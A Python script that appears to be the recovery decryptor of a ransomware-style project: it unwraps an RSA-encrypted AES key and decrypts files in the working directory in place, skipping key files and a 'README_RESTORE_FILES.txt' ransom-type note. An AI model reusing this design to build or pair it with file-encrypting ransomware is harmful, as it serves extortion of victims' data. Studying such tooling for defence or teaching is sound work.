import os
from cryptography.hazmat.primitives import padding, serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding as rsa_padding
from cryptography.hazmat.backends import default_backend
from base64 import b64decode

# === Load private key ===
def load_private_key(private_key_path="../private_key.pem"):
    with open(private_key_path, "rb") as f:
        return serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())

# === Decrypt AES key ===
def decrypt_aes_key(private_key, encrypted_key_path="encrypted_aes_key.bin"):
    with open(encrypted_key_path, "rb") as f:
        encrypted_key = f.read()

    aes_key = private_key.decrypt(
        encrypted_key,
        rsa_padding.OAEP(
            mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return aes_key

# === Unpad data ===
def unpad_data(padded_data):
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(padded_data) + unpadder.finalize()

# === Decrypt file ===
def decrypt_file(file_path, aes_key):
    with open(file_path, "rb") as f:
        content = f.read()

    iv = content[:16]
    ciphertext = content[16:]

    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded = decryptor.update(ciphertext) + decryptor.finalize()
    plaintext = unpad_data(padded)

    with open(file_path, "wb") as f:
        f.write(plaintext)

# === Decrypt directory ===
def decrypt_directory(target_dir, aes_key):
    skip_exts = ['.py', '.pem', '.bin']

    for root, dirs, files in os.walk(target_dir):
        for file in files:
            if any(file.endswith(ext) for ext in skip_exts):
                continue
            if file == "README_RESTORE_FILES.txt":
                continue

            path = os.path.join(root, file)
            try:
                decrypt_file(path, aes_key)
                print(f"Decrypted: {path}")
            except Exception as e:
                print(f"Failed to decrypt {path}: {e}")

# === MAIN ===
if __name__ == "__main__":
    print("Loading private key...")
    private_key = load_private_key()

    print("Decrypting AES key...")
    aes_key = decrypt_aes_key(private_key)

    print("Decrypting files...")
    target_dir = os.getcwd()
    decrypt_directory(target_dir, aes_key)

    print("Decryption complete.")
